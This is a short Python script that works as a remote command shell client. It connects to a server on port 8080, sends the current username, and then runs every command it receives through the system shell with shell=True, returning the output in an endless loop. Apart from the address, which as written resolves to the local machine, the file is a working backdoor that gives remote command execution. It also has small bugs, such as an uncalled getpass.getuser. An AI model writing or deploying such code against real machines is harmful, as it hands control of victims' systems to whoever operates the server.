import time, socket, sys, subprocess
import getpass
import os
socket_server = socket.socket()
server_host = socket.gethostname()
ip = socket.gethostbyname(server_host)
sport = 8080

new_socket = socket.socket()
host_name = socket.gethostname()
server_host = socket.gethostbyname(host_name)

name = str(getpass.getuser)
socket_server.connect((server_host, sport))

socket_server.send(name.encode())
server_name = socket_server.recv(1024)
server_name = server_name.decode()

print(server_name, ' has joined...')


def cmd(command):
    CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

    Output = "None"
    Lines = []
    for Line in CMD.stdout.readlines():
        Line = Line.strip()
        if Line:
            Lines.append(Line.decode('cp866'))
            Output = '\n'.join(Lines)

    return Output


while True:
    message1 = (socket_server.recv(1024)).decode()
    print(server_name, ":", message1)

    message = cmd(message1)
    socket_server.send(message.encode())
